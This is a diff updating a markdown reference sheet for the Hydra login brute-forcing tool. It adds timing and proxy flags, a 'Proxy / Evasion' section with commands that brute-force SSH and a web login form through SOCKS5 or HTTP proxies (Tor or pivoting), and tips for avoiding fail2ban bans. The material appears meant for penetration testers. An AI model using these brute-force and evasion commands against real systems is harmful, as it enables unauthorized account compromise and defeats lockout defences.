@@ -5,7 +5,7 @@ license: AGPL-3.0
 compatibility: "Linux, Windows, macOS. Install: apt install hydra (Kali pre-installed) or build from source. Windows: use Kali WSL."
 metadata:
   author: AeonDave
-  version: "1.0"
+  version: "1.1"
 ---
 
 # Hydra
@@ -46,7 +46,11 @@ hydra -L users.txt -P passwords.txt ssh://192.168.1.10
 | `-V` | Very verbose (show each attempt) |
 | `-d` | Debug |
 | `-R` | Restore previous session |
+| `-I` | Ignore existing restore file (start fresh) |
 | `-e nsr` | Try: n=empty pass, s=user as pass, r=reversed user |
+| `-w <sec>` | Wait time for server response (default 32s) |
+| `-W <sec>` | Wait between connect attempts per thread (rate throttle) |
+| `-x proto` | SOCKS5/HTTP proxy: `-x socks5://127.0.0.1:1080` |
 
 ## Supported Modules (Common)
 
@@ -78,11 +82,25 @@ hydra -l administrator -P passwords.txt winrm://10.10.10.10
 hydra -l admin -P passwords.txt ssh://10.10.10.10 -t 1 -W 3
 ```
 
+## Proxy / Evasion
+
+```bash
+# Route through SOCKS5 (Tor or pivoting)
+hydra -l admin -P passwords.txt -x socks5://127.0.0.1:1080 ssh://10.10.10.10
+
+# HTTP proxy
+hydra -l admin -P passwords.txt -x http://127.0.0.1:8080 http-post-form \
+  "/login:user=^USER^&pass=^PASS^:Invalid"
+```
+
 ## Tips
 
 - Use `-e nsr` for quick wins (null, same as user, reversed)
 - Set `-t 1-4` for protocols with lockout policies (RDP, SMB, WinRM)
+- `-W 3` adds 3s between connect attempts per thread — avoids fail2ban bans
+- `-w` controls response timeout; increase for slow targets (e.g., `-w 10`)
 - For HTTP forms: identify `failure_message` from the response body
+- Use `-I` to ignore leftover restore files from previous interrupted runs
 
 ## Resources
 
